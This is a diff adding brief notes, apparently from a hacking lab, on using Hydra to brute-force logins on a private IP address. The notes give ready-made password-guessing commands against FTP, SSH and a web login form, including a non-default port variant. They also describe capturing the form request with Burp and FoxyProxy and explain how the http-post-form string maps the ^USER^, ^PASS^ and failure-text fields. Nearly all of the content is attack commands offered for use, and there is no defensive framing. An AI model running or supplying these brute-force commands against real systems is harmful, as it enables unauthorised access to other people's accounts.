@@ -1,0 +1,20 @@
+FTP:
+hydra -l user -P passlist.txt ftp://10.113.179.233
+
+SSH:
+hydra -l <username> -P <full path to pass> 10.113.179.233 -t 4 ssh
+
+Post Web Form:
+Enable FoxyProxy with Burp
+Enable the interceptor and submit the request
+In Burp-> Proxy, copy the Raw request payload as page URL, key for login and password, and setup into the command after http-post-form
+hydra -l <username> -P <wordlist> 10.113.179.233 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+non-default port
+hydra -l <username> -P <wordlist> 10.113.179.233 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V
+
+The login page is only /, i.e., the main IP address.
+The username is the form field where the username is entered
+The specified username(s) will replace ^USER^
+The password is the form field where the password is entered
+The provided passwords will be replacing ^PASS^
+Finally, F=incorrect is a string that appears in the server reply when the login fails
